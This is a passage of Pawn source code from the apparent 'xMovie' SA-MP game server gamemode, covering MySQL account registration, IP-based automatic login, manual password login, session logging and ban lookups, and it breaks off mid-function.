	DestroyAllDynamic3DTextLabels();

   	djson_GameModeExit();
	mysql_close(mysqlConnection);
	//printf("%s exitted", MODE_NAME);
	printflog("TERMINATE", "Gamemode unloaded.");
	return 1;
}

public Advert()
{
    mysql_run_query(mysqlConnection, "SELECT `advert_message` FROM "MYSQL_TABLE_ADVERTS" ORDER BY RAND() LIMIT 1", true, "QS_Advert", "");
	return 1;
}

forward QS_Advert();
public QS_Advert()
{
	querybalance--;
	
    new rows, fields;

    cache_get_data(rows, fields);
    if (rows)
    {
        /*	`advert_message`
		(0)	advert_message	varchar(115)
		*/

        new strValue[115];
        cache_get_row(0, 0, strValue);
		SendClientMessageToAll(PlayerColors[random(sizeof(PlayerColors))], ColouredText(strValue));
    }
    return 1;
}

CreatePlayerAccount(playerid, password_decrypted[], password_encrypted[])
{
	if (mysqloffline)
	return SendErrorMessage(playerid, EMBED_RED, "Could not initialize database. (Code #1)");

	new mysqlStr[269];
	GetPlayerName(playerid, playername, sizeof(playername));
	
	mysql_real_escape_string(playername, playername);
	format(mysqlStr, sizeof(mysqlStr), "INSERT INTO "MYSQL_TABLE_ACCOUNTS" (account_name, account_password, account_vip, account_admin) VALUES('%s', '%s', 0, 0)", playername, password_encrypted);
	mysql_run_query(mysqlConnection, mysqlStr, false, "", "");
	
 	format(mysqlStr, sizeof(mysqlStr), "SELECT * FROM "MYSQL_TABLE_ACCOUNTS" WHERE `account_name` = '%s' LIMIT 1", playername);
	mysql_run_query(mysqlConnection, mysqlStr, true, "QS_CreatePlayerAccount", "iiss", playerid, player[playerid][cinc], password_decrypted, password_encrypted);
	return 1;
}

forward QS_CreatePlayerAccount(playerid, ccinc, password_decrypted[], password_encrypted[]);
public QS_CreatePlayerAccount(playerid, ccinc, password_decrypted[], password_encrypted[])
{
	querybalance--;
	checkcinc();

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows) // player is registered
    {
        /*
		(0)	account_id      	int(11)
		(1)	account_name        varchar(24)
		(2)	account_password    varchar(129)
		(3)	account_vip         tinyint(1)
		(4)	account_admin       tinyint(1)
		*/

		player[playerid][logged] = 1;

        new strValue[11];
        cache_get_row(0, 0, strValue);  player[playerid][accountid] = strval(strValue);

	    new mysqlStr[1478],
			log_last_date[11],
		    log_last_time[9],
			log_ip[16];

		GetPlayerName(playerid, playername, sizeof(playername));
		getdate(year, month, day);
		gettime(hour, minute, second);
		format(log_last_date, sizeof(log_last_date), "%d-%02d-%02d", year, month, day);
		format(log_last_time, sizeof(log_last_time), "%02d:%02d:%02d", hour, minute, second);
		GetPlayerIp(playerid, log_ip, sizeof(log_ip));

	    mysqlStr = 							"INSERT INTO "MYSQL_TABLE_PLAYER_LOGS" (account_id, player_log_login_success_count, player_log_login_fail_count, player_log_last_login_date_1, player_log_last_login_date_2, player_log_last_login_date_3, player_log_last_login_date_4, player_log_last_login_date_5, player_log_last_login_time_1, player_log_last_login_time_2, player_log_last_login_time_3, ";
		format(mysqlStr, sizeof(mysqlStr),	"%splayer_log_last_login_time_4, player_log_last_login_time_5, player_log_last_logout_date_1, player_log_last_logout_date_2, player_log_last_logout_date_3, player_log_last_logout_date_4, player_log_last_logout_date_5, player_log_last_logout_time_1, player_log_last_logout_time_2, player_log_last_logout_time_3, player_log_last_logout_time_4, player_log_last_logout_time_5, ", mysqlStr);
		format(mysqlStr, sizeof(mysqlStr),	"%splayer_log_last_connect_date, player_log_last_connect_time, player_log_register_date, player_log_register_time, player_log_total_playtime, player_log_kick_count, player_log_ban_count, player_log_warn_count, player_log_connect_count, player_log_register_ip, player_log_connect_ip, player_log_login_ip) ", mysqlStr);
		format(mysqlStr, sizeof(mysqlStr),	"%sVALUES(%d, 1, 0, '%s', '0000-00-00', '0000-00-00', '0000-00-00', '0000-00-00', '%s', '00:00:00', '00:00:00', '00:00:00', '00:00:00', '%s', '0000-00-00', '0000-00-00', '0000-00-00', '0000-00-00', '%s', '00:00:00', '00:00:00', '00:00:00', '00:00:00', ", mysqlStr, player[playerid][accountid], log_last_date, log_last_time, log_last_date, log_last_time);
		format(mysqlStr, sizeof(mysqlStr),	"%s'%s', '%s', '%s', '%s', %d, 0, 0, 0, 1, '%s', '%s', '%s')", mysqlStr, log_last_date, log_last_time, log_last_date, log_last_time, player[playerid][playtime]/60, log_ip, log_ip, log_ip);
		mysql_run_query(mysqlConnection, mysqlStr, false, "", "");

		format(mysqlStr, sizeof(mysqlStr), 	"INSERT INTO "MYSQL_TABLE_PREFERENCES" (account_id, preference_email, preference_hide, preference_god, preference_vgod, preference_greeting, preference_location) VALUES(%d, '', 0, 1, 0, '', 0)", player[playerid][accountid]);
		mysql_run_query(mysqlConnection, mysqlStr, false, "", "");

		format(logstring, sizeof(logstring), "[Secured] %s (id: %d) has registered. (Account #%d)", playername, playerid, player[playerid][accountid]);
		printflog("REGISTER", logstring);
		SendMessageToAdmins(COLOR_BROWN, logstring, 3);
		format(strings, sizeof(strings), "* You have succesfully registered a Secured Account. Your password was set to \"%s\", don't lose it! *", password_decrypted);
		SendServerMessage(playerid, EMBED_LIGHTBLUE , strings);
		format(ircstring, sizeof(ircstring), "8,2[Secured] %s (id: %d) has registered. (Account #%d)", playername, playerid, player[playerid][accountid]);
		IRC_GroupSay(1, IRCOP_CHANNEL, ircstring);
	} else SendErrorMessage(playerid, EMBED_RED, "Could not initialize database. (Code #1)");
	return 1;
}

forward QS_AssignPlayerAccount(playerid, ccinc);
public QS_AssignPlayerAccount(playerid, ccinc)
{
	querybalance--;
	checkcinc();

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows) // player is registered
    {
        /*
		(0)	account_id      	int(11)
		(1)	account_name        varchar(24)
		(2)	account_password    varchar(129)
		(3)	account_vip         tinyint(1)
		(4)	account_admin       tinyint(1)
		*/

		player[playerid][logintimeout] = 63;

        new strValue[11];
        cache_get_row(0, 0, strValue);  player[playerid][accountid] = strval(strValue);

		new mysqlStr[243];
		GetPlayerIp(playerid, playerip, sizeof(playerip));
        format(mysqlStr, sizeof(mysqlStr), "SELECT * FROM accounts, player_logs, preferences WHERE accounts.account_id = %d AND player_logs.account_id = %d AND player_logs.player_log_login_ip = '%s' AND preferences.account_id = %d LIMIT 1", player[playerid][accountid], player[playerid][accountid], playerip, player[playerid][accountid]);
  		mysql_run_query(mysqlConnection, mysqlStr, true, "QS_AutomaticPlayerLogin", "ii", playerid, player[playerid][cinc]);
	} else { // player is not registered
        if (playerid >= MAX_PLAYERS-MAX_RESERVED_SLOTS)
        {
			/*GetPlayerName(playerid, playername, sizeof(playername));
			format(logstring, sizeof(logstring), "Kicked %s. (Reserved slot for donators & admins, please try again later)", playername);
			SendServerMessage(playerid, EMBED_RED, logstring);
			printflog("KICK-A", logstring);
			SendServerMessage(playerid, EMBED_ORANGE, "-> Would you like to be able to join the server any time you want? Apply for a reserved slot now!");
			SendServerMessage(playerid, EMBED_ORANGE, "www.xmovieserver.com/donate");*/
   			//format(logstring, sizeof(logstring), "15,6Kicked %s. (Reserved slot for donators & admins, please try again later)", playername);
			//IRC_GroupSay(1, IRC_CHANNEL, logstring);
		 	player[playerid][muted] = 1;
			SetTimerEx("ReservedSlotKick", 4000, 0, "i", playerid);
        } else player[playerid][accountid] = 0;
	}
	return 1;
}

forward QS_AutomaticPlayerLogin(playerid, ccinc);
public QS_AutomaticPlayerLogin(playerid, ccinc)
{
	querybalance--;
	checkcinc();

    new rows, fields,
		mysqlStr[683],
		log_last_cdate[11],
		log_last_ctime[9],
		log_ip[16];

    cache_get_data(rows, fields);
    if (rows) // force automatic login because player matches last used name and ip
    {
        /*
		(0)		account_id      				int(11)
		(1)		account_name        			varchar(24)
		(2)		account_password    			varchar(129)
		(3)		account_vip         			tinyint(1)
		(4)		account_admin       			tinyint(1)

		(5)     account_id          			int(11)
		(6)		player_log_login_success_count 	int(11)
		(7)		player_log_login_fail_count		int(11)
		(8)		player_log_last_login_date_1   	date
		(9)		player_log_last_login_date_2   	date
		(10)	player_log_last_login_date_3   	date
		(11)	player_log_last_login_date_4   	date
		(12)	player_log_last_login_date_5   	date
		(13)	player_log_last_login_time_1   	time
		(14)	player_log_last_login_time_2   	time
		(15)	player_log_last_login_time_3   	time
		(16)	player_log_last_login_time_4   	time
		(17)	player_log_last_login_time_5   	time
		(18)	player_log_last_logout_date_1  	date
		(19)	player_log_last_logout_date_2  	date
		(20)	player_log_last_logout_date_3  	date
		(21)	player_log_last_logout_date_4  	date
		(22)	player_log_last_logout_date_5  	date
		(23)	player_log_last_logout_time_1  	time
		(24)	player_log_last_logout_time_2  	time
		(25)	player_log_last_logout_time_3  	time
		(26)	player_log_last_logout_time_4  	time
		(27)	player_log_last_logout_time_5  	time
		(28)	player_log_last_connect_date  	date
		(29)	player_log_last_connect_time  	time
		(30)	player_log_register_date      	date
		(31)	player_log_register_time      	time
		(32)	player_log_total_playtime       int(11)
		(33)	player_log_kick_count         	int(11)
		(34)	player_log_ban_count          	int(11)
		(35)	player_log_warn_count         	int(11)
		(36)	player_log_connect_count      	int(11)
		(37)	player_log_register_ip        	varchar(16)
		(38)	player_log_connect_ip         	varchar(16)
		(39)	player_log_login_ip				varchar16)

		(40)    account_id						int(11)
		(41)	preference_email                varchar(40)
		(42)	preference_hide       	 		tinyint(1)
		(43)	preference_god        			tinyint(1)
		(44)	preference_vgod       			tinyint(1)
		(45)	preference_greeting				varchar(100)
		(46)	preference_location    			float
		*/

		player[playerid][logintimeout] = -1;
		player[playerid][logged] = 1;

  		new strValue[100],
		  	playerrank[35] = "?";
		  	
        cache_get_row(0, 3, strValue);	player[playerid][VIP] = strval(strValue);
        cache_get_row(0, 4, strValue);	player[playerid][ADMIN] = strval(strValue);
        cache_get_row(0, 42, strValue);	player[playerid][hideadmin] = strval(strValue);
        cache_get_row(0, 43, strValue);	if (servergodmode) player[playerid][godmode] = strval(strValue);
        cache_get_row(0, 44, strValue);	if (servergodmode) player[playerid][vgodmode] = strval(strValue);

		player[playerid][muted] = 0;

		GetPlayerName(playerid, playername, sizeof(playername));
		switch(player[playerid][ADMIN])
		{
		    case 0:
		    {
		        if (!player[playerid][VIP])
		        {
			        if (playerid >= MAX_PLAYERS-MAX_RESERVED_SLOTS)
			        {
						/*format(logstring, sizeof(logstring), "Kicked %s. (Reserved slot for donators & admins, please try again later)", playername);
						SendServerMessage(playerid, EMBED_RED, logstring);
						printflog("KICK-A", logstring);
						SendServerMessage(playerid, EMBED_ORANGE, "-> Would you like to be able to join the server any time you want? Apply for a reserved slot now!");
						SendServerMessage(playerid, EMBED_ORANGE, "www.xmovieserver.com/donate");*/
						//format(logstring, sizeof(logstring), "15,6Kicked %s. (Reserved slot for donators & admins, please try again later)", playername);
						//IRC_GroupSay(1, IRC_CHANNEL, logstring);
					 	player[playerid][muted] = 1;
						SetTimerEx("ReservedSlotKick", 4000, 0, "i", playerid);
				        return 1;
			        }
					playerrank = "Secured Player";
		        } else {
					playerrank = "Server VIP";
		        }
		    }
		    case 1,2:
		    {
				player[playerid][adminmsgs] = 1;
				format(playerrank, sizeof(playerrank), "Server Moderator (Level %d)", player[playerid][ADMIN]);
		    }
		    case 3:
		    {
		    	player[playerid][adminmsgs] = 1;
				format(playerrank, sizeof(playerrank), "Server Operator (Level %d)", player[playerid][ADMIN]);
		    }
		    case 4:
		    {
		    	player[playerid][adminmsgs] = 1;
				format(playerrank, sizeof(playerrank), "Server Administrator (Level %d)", player[playerid][ADMIN]);
		    }
			case 5,6:
		    {
		    	player[playerid][adminmsgs] = 1;
				format(playerrank, sizeof(playerrank), "Super Sexy Admin (Level %d)", player[playerid][ADMIN]);
		    }
		}
		format(logstring, sizeof(logstring), "Welcome back %s, you are automatically logged in as a %s.", playername, playerrank);
		SendServerMessage(playerid, EMBED_WHITE, logstring);
		GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~g~~h~~h~SUCCESS", 2000, 3);
		format(logstring, sizeof(logstring), "[A-1]: "EMBED_BROWN"%s (id: %d) has automatically logged in as a %s.", playername, playerid, playerrank);
		for (new a = 0; a < MAX_PLAYERS; a++)
		{
		    if (IsPlayerConnected(a) && player[a][ADMIN] >= 1 && player[a][adminmsgs] == 1)
		    {
		        if (a == playerid)
		        continue;

				SendClientMessage(a, COLOR_RED, logstring);
			}
		}
		format(logstring, sizeof(logstring), "[A-1]: %s (id: %d) has automatically logged in as a %s.", playername, playerid, playerrank);
		printflog("LOGIN-A", logstring);
		format(ircstring, sizeof(ircstring), "12%s", logstring);
		IRC_GroupSay(1, IRCOP_CHANNEL, ircstring);

		/*if (player[playerid][VIP] == 1)
		{
			if (player[playerid][ADMIN] != 0)
			{
				if (player[playerid][hideadmin] == 0)
				{
					cache_get_row(0, 45, strValue);
					if (!isnull(strValue))
					SendPlayerMessageToAll(playerid, ColouredText(strValue));
				} else {
					SendServerMessage(playerid, EMBED_ORANGE, "You are automatically hidden from the admin list.");
				}
			} else {
				cache_get_row(0, 45, strValue);
				if (!isnull(strValue))
				SendPlayerMessageToAll(playerid, ColouredText(strValue));
			}
		}*/

		if (player[playerid][hideadmin] == 1)
		SendServerMessage(playerid, EMBED_ORANGE, "You are automatically hidden from the admin list.");
			
		cache_get_row(0, 45, strValue);
		if (!isnull(strValue))
		SendPlayerMessageToAll(playerid, ColouredText(strValue));

		if (player[playerid][spawned] == 1)
		{
		    ShowPlayerDialog(playerid, DIALOGID_SPAWN, DIALOG_STYLE_MSGBOX, "xMovie Server Rules", serverrules, "spawn 1", "spawn 2");
		    TogglePlayerControllable(playerid, 1);
	    }

		new log_last_date[5][11],
		    log_last_time[5][9];

		getdate(year, month, day);
		gettime(hour, minute, second);
		format(log_last_date[0], 11, "%d-%02d-%02d", year, month, day);
		format(log_last_time[0], 9, "%02d:%02d:%02d", hour, minute, second);
		GetPlayerIp(playerid, log_ip, sizeof(log_ip));

		for (new sessions = 0; sessions < 4; sessions++) // only need first 4
		{
			cache_get_row(0, sessions+8, log_last_date[sessions+1]);	// date
			cache_get_row(0, sessions+13, log_last_time[sessions+1]);	// time
		}

	    format(mysqlStr, sizeof(mysqlStr), "UPDATE "MYSQL_TABLE_PLAYER_LOGS" SET `player_log_login_success_count` = player_log_login_success_count +1, `player_log_last_login_date_1` = '%s', `player_log_last_login_date_2` = '%s', `player_log_last_login_date_3` = '%s', `player_log_last_login_date_4` = '%s', `player_log_last_login_date_5` = '%s', ", log_last_date[0], log_last_date[1], log_last_date[2], log_last_date[3], log_last_date[4]);
		format(mysqlStr, sizeof(mysqlStr), "%s`player_log_last_login_time_1` = '%s', `player_log_last_login_time_2` = '%s', `player_log_last_login_time_3` = '%s', `player_log_last_login_time_4` = '%s', `player_log_last_login_time_5` = '%s', `player_log_login_ip` = '%s' WHERE `account_id` = %d LIMIT 1", mysqlStr, log_last_time[0], log_last_time[1], log_last_time[2], log_last_time[3], log_last_time[4], log_ip, player[playerid][accountid]);
  		mysql_run_query(mysqlConnection, mysqlStr, false, "", "");

		CheckAccountBan(playerid);
	} else { // player does not match last used ip
		SendServerMessage(playerid, EMBED_GREENYELLOW , "This account is secured. Please login.");
		SendServerMessage(playerid, EMBED_LIGHTBLUE , "This account is secured. Please login.");
		SendServerMessage(playerid, EMBED_ORANGE , "This account is secured. Please login.");
	 	player[playerid][muted] = 1;
	 	
		GetPlayerName(playerid, playername, sizeof(playername));
		format(sMsg, sizeof(sMsg), "{00FFFF}Welcome to the xMovie Server, Mr %s. "EMBED_RED"This account is secured, please login!\n\n"EMBED_LIME"Website: www.xmovieserver.com (new website soon!)\n\n"EMBED_WHITE"Latest news:"EMBED_GREY"\n%s", playername, servermessage);
		strcat(sMsg, "\n\nIRC Server: irc.gtanet.com\nIRC Channel: #xmovie\n\n\n{FFFF00}This server is brought to you by MrPepino, spacemud, [FRAG]B and ofcourse all the donators!\nAlso big thanks to Commissioner, zorro628, spacemud and [FRAG]B for categorizing a bunch of stuff.\n\np.s. spacemud likes horses");
	    ShowPlayerDialog(playerid, DIALOGID_LOGIN, DIALOG_STYLE_PASSWORD, "xMovie Server", sMsg, "Login", "");
	}

	getdate(year, month, day);
	gettime(hour, minute, second);
	format(log_last_cdate, sizeof(log_last_cdate), "%d-%02d-%02d", year, month, day);
	format(log_last_ctime, sizeof(log_last_ctime), "%02d:%02d:%02d", hour, minute, second);
	GetPlayerIp(playerid, log_ip, sizeof(log_ip));

	format(mysqlStr, sizeof(mysqlStr), "UPDATE "MYSQL_TABLE_PLAYER_LOGS" SET `player_log_last_connect_date` = '%s', `player_log_last_connect_time` = '%s', `player_log_connect_count` = player_log_connect_count +1, `player_log_connect_ip` = '%s' WHERE `account_id` = %d LIMIT 1", log_last_cdate, log_last_ctime, log_ip, player[playerid][accountid]);
	mysql_run_query(mysqlConnection, mysqlStr, false, "", "");
	return 1;
}

forward QS_ManualPlayerLogin(playerid, ccinc);
public QS_ManualPlayerLogin(playerid, ccinc)
{
	querybalance--;
	checkcinc();

    new rows, fields,
		mysqlStr[683];

    cache_get_data(rows, fields);
    if (rows) // allow login because player matches last used name and password		|OR|    player matches ghost account and password
    {
        /*
		(0)		account_id      				int(11)
		(1)		account_name        			varchar(24)
		(2)		account_password    			varchar(129)
		(3)		account_vip         			tinyint(1)
		(4)		account_admin       			tinyint(1)

		(5)     account_id          			int(11)
		(6)		player_log_login_success_count 	int(11)
		(7)		player_log_login_fail_count		int(11)
		(8)		player_log_last_login_date_1   	date
		(9)		player_log_last_login_date_2   	date
		(10)	player_log_last_login_date_3   	date
		(11)	player_log_last_login_date_4   	date
		(12)	player_log_last_login_date_5   	date
		(13)	player_log_last_login_time_1   	time
		(14)	player_log_last_login_time_2   	time
		(15)	player_log_last_login_time_3   	time
		(16)	player_log_last_login_time_4   	time
		(17)	player_log_last_login_time_5   	time
		(18)	player_log_last_logout_date_1  	date
		(19)	player_log_last_logout_date_2  	date
		(20)	player_log_last_logout_date_3  	date
		(21)	player_log_last_logout_date_4  	date
		(22)	player_log_last_logout_date_5  	date
		(23)	player_log_last_logout_time_1  	time
		(24)	player_log_last_logout_time_2  	time
		(25)	player_log_last_logout_time_3  	time
		(26)	player_log_last_logout_time_4  	time
		(27)	player_log_last_logout_time_5  	time
		(28)	player_log_last_connect_date  	date
		(29)	player_log_last_connect_time  	time
		(30)	player_log_register_date      	date
		(31)	player_log_register_time      	time
		(32)	player_log_total_playtime       int(11)
		(33)	player_log_kick_count         	int(11)
		(34)	player_log_ban_count          	int(11)
		(35)	player_log_warn_count         	int(11)
		(36)	player_log_connect_count      	int(11)
		(37)	player_log_register_ip        	varchar(16)
		(38)	player_log_connect_ip         	varchar(16)
		(39)	player_log_login_ip				varchar16)
		
		(40)    account_id						int(11)
		(41)	preference_email                varchar(40)
		(42)	preference_hide       	 		tinyint(1)
		(43)	preference_god        			tinyint(1)
		(44)	preference_vgod       			tinyint(1)
		(45)	preference_greeting				varchar(100)
		(46)	preference_location    			float
		*/

		player[playerid][logintimeout] = -1;
		player[playerid][logged] = 1;

  		new strValue[100],
		  	playerrank[35] = "?";
		  	
        cache_get_row(0, 3, strValue);	player[playerid][VIP] = strval(strValue);
        cache_get_row(0, 4, strValue);	player[playerid][ADMIN] = strval(strValue);
        cache_get_row(0, 42, strValue);	player[playerid][hideadmin] = strval(strValue);
        cache_get_row(0, 43, strValue);	if (servergodmode) player[playerid][godmode] = strval(strValue);
        cache_get_row(0, 44, strValue);	if (servergodmode) player[playerid][vgodmode] = strval(strValue);

		player[playerid][muted] = 0;

		GetPlayerName(playerid, playername, sizeof(playername));
		switch(player[playerid][ADMIN])
		{
		    case 0:
		    {
		        if (!player[playerid][VIP])
		        {
			        if (playerid >= MAX_PLAYERS-MAX_RESERVED_SLOTS)
			        {
						/*format(logstring, sizeof(logstring), "Kicked %s. (Reserved slot for donators & admins, please try again later)", playername);
						SendServerMessage(playerid, EMBED_RED, logstring);
						printflog("KICK-A", logstring);
						SendServerMessage(playerid, EMBED_ORANGE, "-> Would you like to be able to join the server any time you want? Apply for a reserved slot now!");
						SendServerMessage(playerid, EMBED_ORANGE, "www.xmovieserver.com/donate");*/
						//format(logstring, sizeof(logstring), "15,6Kicked %s. (Reserved slot for donators & admins, please try again later)", playername);
						//IRC_GroupSay(1, IRC_CHANNEL, logstring);
					 	player[playerid][muted] = 1;
						SetTimerEx("ReservedSlotKick", 4000, 0, "i", playerid);
				        return 1;
			        }
					playerrank = "Secured Player";
		        } else {
					playerrank = "Server VIP";
		        }
		    }
		    case 1,2:
		    {
				player[playerid][adminmsgs] = 1;
				format(playerrank, sizeof(playerrank), "Server Moderator (Level %d)", player[playerid][ADMIN]);
		    }
		    case 3:
		    {
		    	player[playerid][adminmsgs] = 1;
				format(playerrank, sizeof(playerrank), "Server Operator (Level %d)", player[playerid][ADMIN]);
		    }
		    case 4:
		    {
		    	player[playerid][adminmsgs] = 1;
				format(playerrank, sizeof(playerrank), "Server Administrator (Level %d)", player[playerid][ADMIN]);
		    }
			case 5,6:
		    {
		    	player[playerid][adminmsgs] = 1;
				format(playerrank, sizeof(playerrank), "Super Sexy Admin (Level %d)", player[playerid][ADMIN]);
		    }
		}
		format(logstring, sizeof(logstring), "Welcome back %s, you have succesfully logged in as a %s.", playername, playerrank);
		SendServerMessage(playerid, EMBED_WHITE, logstring);
		GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~g~~h~~h~SUCCESS", 2000, 3);
		format(logstring, sizeof(logstring), "[A-1]: "EMBED_BROWN"%s (id: %d) has succesfully logged in as a %s.", playername, playerid, playerrank);
		for (new a = 0; a < MAX_PLAYERS; a++)
		{
		    if (IsPlayerConnected(a) && player[a][ADMIN] >= 1 && player[a][adminmsgs] == 1)
		    {
		        if (a == playerid)
		        continue;
		        
				SendClientMessage(a, COLOR_RED, logstring);
			}
		}
		format(logstring, sizeof(logstring), "[A-1]: %s (id: %d) has succesfully logged in as a %s.", playername, playerid, playerrank);
		printflog("LOGIN-A", logstring);
		format(ircstring, sizeof(ircstring), "12%s", logstring);
		IRC_GroupSay(1, IRCOP_CHANNEL, ircstring);

		/*if (player[playerid][VIP] == 1)
		{
			if (player[playerid][ADMIN] != 0)
			{
				if (player[playerid][hideadmin] == 0)
				{
					cache_get_row(0, 45, strValue);
					if (!isnull(strValue))
					SendPlayerMessageToAll(playerid, ColouredText(strValue));
				} else {
					SendServerMessage(playerid, EMBED_ORANGE, "You are automatically hidden from the admin list.");
				}
			} else {
				cache_get_row(0, 45, strValue);
				if (!isnull(strValue))
				SendPlayerMessageToAll(playerid, ColouredText(strValue));
			}
		}*/
		
		if (player[playerid][hideadmin] == 1)
		SendServerMessage(playerid, EMBED_ORANGE, "You are automatically hidden from the admin list.");

		cache_get_row(0, 45, strValue);
		if (!isnull(strValue))
		SendPlayerMessageToAll(playerid, ColouredText(strValue));
		
		if (player[playerid][spawned] == 1)
		{
		    ShowPlayerDialog(playerid, DIALOGID_SPAWN, DIALOG_STYLE_MSGBOX, "xMovie Server Rules", serverrules, "spawn 1", "spawn 2");
		    TogglePlayerControllable(playerid, 1);
	    }

		new log_last_date[5][11],
		    log_last_time[5][9],
			log_ip[16];

		getdate(year, month, day);
		gettime(hour, minute, second);
		format(log_last_date[0], 11, "%d-%02d-%02d", year, month, day);
		format(log_last_time[0], 9, "%02d:%02d:%02d", hour, minute, second);
		GetPlayerIp(playerid, log_ip, sizeof(log_ip));
		
		for (new sessions = 0; sessions < 4; sessions++) // only need first 4
		{
			cache_get_row(0, sessions+8, log_last_date[sessions+1]);	// date
			cache_get_row(0, sessions+13, log_last_time[sessions+1]);	// time
		}

	    format(mysqlStr, sizeof(mysqlStr), "UPDATE "MYSQL_TABLE_PLAYER_LOGS" SET `player_log_login_success_count` = player_log_login_success_count +1, `player_log_last_login_date_1` = '%s', `player_log_last_login_date_2` = '%s', `player_log_last_login_date_3` = '%s', `player_log_last_login_date_4` = '%s', `player_log_last_login_date_5` = '%s', ", log_last_date[0], log_last_date[1], log_last_date[2], log_last_date[3], log_last_date[4]);
		format(mysqlStr, sizeof(mysqlStr), "%s`player_log_last_login_time_1` = '%s', `player_log_last_login_time_2` = '%s', `player_log_last_login_time_3` = '%s', `player_log_last_login_time_4` = '%s', `player_log_last_login_time_5` = '%s', `player_log_login_ip` = '%s' WHERE `account_id` = %d LIMIT 1", mysqlStr, log_last_time[0], log_last_time[1], log_last_time[2], log_last_time[3], log_last_time[4], log_ip, player[playerid][accountid]);
  		mysql_run_query(mysqlConnection, mysqlStr, false, "", "");

		CheckAccountBan(playerid);
	} else { // player does not match password
		ShowPlayerDialog(playerid, DIALOGID_LOGIN, DIALOG_STYLE_PASSWORD, ""EMBED_RED"Error", "Incorrect password for Secured Account.\nPlease enter your password below:", "Login", "Cancel");
	  	player[playerid][loginfail] += 1;
	  	
        GetPlayerName(playerid, playername, sizeof(playername));
		format(logstring, sizeof(logstring), "Login attempt by %s (id: %d) - incorrect password.", playername, playerid);
		SendServerMessageToAdmins(EMBED_BROWN, logstring, 1);
		printflog("LOGIN-F", logstring);
		
		format(ircstring, sizeof(ircstring), "4%s", logstring);
		IRC_GroupSay(1, IRCOP_CHANNEL, ircstring);
		SendErrorMessage(playerid, EMBED_WHITE, "The password you have entered is incorrect.");

		format(mysqlStr, sizeof(mysqlStr), "UPDATE "MYSQL_TABLE_PLAYER_LOGS" SET `player_log_login_fail_count` = player_log_login_fail_count +1 WHERE `account_id` = %d LIMIT 1", player[playerid][accountid]);
		mysql_run_query(mysqlConnection, mysqlStr, false, "", "");

	  	if (player[playerid][loginfail] == MAX_LOGIN_ATTEMPTS)
	  	{
			format(strings, sizeof(strings), "Kicked %s. (Reason: Failed to login in Secured account [Code #3])", playername);
			SendServerMessageToAll(EMBED_RED, strings);
			printflog("KICK-A", strings);
			
			format(ircstring, sizeof(ircstring), "8,1%s", strings);
			IRC_GroupSay(1, IRC_CHANNEL, ircstring);
			KickEx(playerid);

			format(mysqlStr, sizeof(mysqlStr), "UPDATE "MYSQL_TABLE_PLAYER_LOGS" SET `player_log_kick_count` = player_log_kick_count +1 WHERE `account_id` = %d LIMIT 1", player[playerid][accountid]);
			mysql_run_query(mysqlConnection, mysqlStr, false, "", "");
	  	}
	}
	return 1;
}

forward QS_LogPlayerSession(playerid, account_id);
public QS_LogPlayerSession(playerid, account_id)
{
	querybalance--;

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows)
    {
        /*
		(0)     account_id          			int(11)
		(1)		player_log_login_success_count 	int(11)
		(2)		player_log_login_fail_count		int(11)
		(3)		player_log_last_login_date_1   	date
		(4)		player_log_last_login_date_2   	date
		(5)		player_log_last_login_date_3   	date
		(6)		player_log_last_login_date_4   	date
		(7)		player_log_last_login_date_5   	date
		(8)		player_log_last_login_time_1   	time
		(9)		player_log_last_login_time_2   	time
		(10)	player_log_last_login_time_3   	time
		(11)	player_log_last_login_time_4   	time
		(12)	player_log_last_login_time_5   	time
		(13)	player_log_last_logout_date_1  	date
		(14)	player_log_last_logout_date_2  	date
		(15)	player_log_last_logout_date_3  	date
		(16)	player_log_last_logout_date_4  	date
		(17)	player_log_last_logout_date_5  	date
		(18)	player_log_last_logout_time_1  	time
		(19)	player_log_last_logout_time_2  	time
		(20)	player_log_last_logout_time_3  	time
		(21)	player_log_last_logout_time_4  	time
		(22)	player_log_last_logout_time_5  	time
		(23)	player_log_last_connect_date  	date
		(24)	player_log_last_connect_time  	time
		(25)	player_log_register_date      	date
		(26)	player_log_register_time      	time
		(27)	player_log_total_playtime       int(11)
		(28)	player_log_kick_count         	int(11)
		(29)	player_log_ban_count          	int(11)
		(30)	player_log_warn_count         	int(11)
		(31)	player_log_connect_count      	int(11)
		(32)	player_log_register_ip        	varchar(16)
		(33)	player_log_connect_ip         	varchar(16)
		(34)	player_log_login_ip				varchar16)
		*/
		
		new mysqlStr[649],
			log_last_date[5][11],
		    log_last_time[5][9];

		getdate(year, month, day);
		gettime(hour, minute, second);
		format(log_last_date[0], 11, "%d-%02d-%02d", year, month, day);
		format(log_last_time[0], 9, "%02d:%02d:%02d", hour, minute, second);

		for (new sessions = 0; sessions < 4; sessions++) // only need first 4
		{
			cache_get_row(0, sessions+13, log_last_date[sessions+1]);	// date
			cache_get_row(0, sessions+18, log_last_time[sessions+1]);	// time
		}

	    format(mysqlStr, sizeof(mysqlStr), "UPDATE "MYSQL_TABLE_PLAYER_LOGS" SET `player_log_last_logout_date_1` = '%s', `player_log_last_logout_date_2` = '%s', `player_log_last_logout_date_3` = '%s', `player_log_last_logout_date_4` = '%s', `player_log_last_logout_date_5` = '%s', ", log_last_date[0], log_last_date[1], log_last_date[2], log_last_date[3], log_last_date[4]);
		format(mysqlStr, sizeof(mysqlStr), "%s`player_log_last_logout_time_1` = '%s', `player_log_last_logout_time_2` = '%s', `player_log_last_logout_time_3` = '%s', `player_log_last_logout_time_4` = '%s', `player_log_last_logout_time_5` = '%s', `player_log_total_playtime` = player_log_total_playtime +%d WHERE `account_id` = %d LIMIT 1", mysqlStr, log_last_time[0], log_last_time[1], log_last_time[2], log_last_time[3], log_last_time[4], player[playerid][playtime]/60, account_id);
  		mysql_run_query(mysqlConnection, mysqlStr, false, "", "");
	}
	ResetPlayerArrays(playerid);
	return 1;
}

CheckAccountBan(playerid)
{
	new mysqlStr[75];
	format(mysqlStr, sizeof(mysqlStr), "SELECT * FROM "MYSQL_TABLE_BANS" WHERE `account_id` = %d LIMIT 1", GetPlayerAccountID(playerid));
    mysql_run_query(mysqlConnection, mysqlStr, true, "QS_CheckAccountBan", "ii", playerid, player[playerid][cinc]);
	return 1;
}

forward QS_CheckAccountBan(playerid, ccinc);
public QS_CheckAccountBan(playerid, ccinc)
{
	querybalance--;
	checkcinc();

    new rows, fields;

    cache_get_data(rows, fields);
